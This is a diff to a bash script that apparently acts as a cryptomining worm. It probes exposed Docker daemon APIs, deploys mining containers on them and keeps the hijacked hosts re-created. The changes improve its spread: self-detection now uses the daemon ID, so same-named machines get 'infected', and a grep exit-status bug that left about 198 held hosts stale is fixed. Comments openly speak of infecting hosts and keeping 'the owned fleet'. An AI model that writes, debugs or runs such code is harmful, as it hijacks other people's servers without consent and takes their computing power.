@@ -39,6 +39,11 @@ PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
 PORTS="${DOCK_PORTS:-2375 2376 4243}"
 SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
+# Our own daemon's identity, so "is this host ourselves?" is answered exactly and not
+# by hostname (shared image hostnames, see the self-check in dock_one).
+MYID=$(curl -sS -m 4 --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null \
+     | grep -o '"ID":"[^"]*"' | head -1 | cut -d'"' -f4) || MYID=""
+[ -n "${MYID:-}" ] || MYID=""
 # ---- self-healing cadence ---------------------------------------------------
 # Our timer shipped with a 6h period, which throttled the whole vector. The
 # updater rewrites unit files but never their intervals, so enforce it here too:
@@ -371,12 +376,20 @@ dock_one() {
     memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
     ncpu=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
     [ -n "${memb:-}" ] && printf '%s\t%s\n' "$1" "$memb" >> "$RAMFILE"
+    # Identity is the daemon ID, NOT the hostname: boxes built from one image share a
+    # hostname (13 hosts in this walk call themselves exactly what our own box does),
+    # and this test used to `return` right here - BEFORE the container check - so those
+    # hosts were skipped and their stale container never re-created. A name match that
+    # is not our ID is a different machine and is worth infecting.
+    selfbox=0
     if [ "$SKIPSELF" = yes ]; then
         me=$(hostname 2>/dev/null) || me=""
         nm=$(printf '%s' "$inf" | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
-        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
-            echo "dock: $ip is this host (payload mines here already)"
-            return 0
+        rid=$(printf '%s' "$inf" | grep -o '"ID":"[^"]*"' | head -1 | cut -d'"' -f4)
+        if [ -n "${rid:-}" ] && [ -n "${MYID:-}" ]; then
+            [ "$rid" = "$MYID" ] && selfbox=1
+        elif [ -n "$me" ] && [ -n "${nm:-}" ] && [ "$nm" = "$me" ]; then
+            selfbox=1
         fi
     fi
 
@@ -413,7 +426,15 @@ dock_one() {
             # already hold.
             cj=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null) || cj=""
             shares=$(printf '%s' "$cj" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
-            hasip=$(printf '%s' "$cj" | grep -c "\"$ip\"")
+            # `grep -c` PRINTS 0 but EXITS 1 when nothing matches, and it is the last
+            # command of this substitution - so the assignment itself returned 1 and
+            # `set -e` killed the entire dock_one subshell, silently, right after its
+            # "daemon" line. A held host whose Cmd has no per-host rig id (i.e. every
+            # pre-fix container) was exactly the hasip=0 case: 218 daemons probed, 7
+            # deployed, 0 re-creates - and ~198 hosts died on this one line. Hosts
+            # with NO container never reach it, which is why only fresh hosts ever
+            # converted and the owned fleet stayed stale run after run.
+            hasip=$(printf '%s' "$cj" | grep -c "\"$ip\"") || hasip=0
             # Config drift is a re-create reason - but a re-create must never cost
             # us the host. So remember the old id, leave the container RUNNING, and
             # let the deploy path delete it only AFTER the replacement is verified.
@@ -503,6 +524,13 @@ dock_one() {
         # returned right here anyway - so a "re-creating" host was logged, counted and
         # then left untouched, run after run. That is why every host we still held was
         # mining on 1 thread with no thread hint and no published API.
+
+    # The self-check above only *decides* - and only now, after the have-block: a host
+    # that IS this box but holds a stale container of ours still needs the re-create.
+    if [ "${selfbox:-0}" = 1 ]; then
+        echo "dock: $ip is this host (payload mines here already)"
+        return 0
+    fi
 
     # pick a free boring name; "taken" means the list mentions it
     name=""
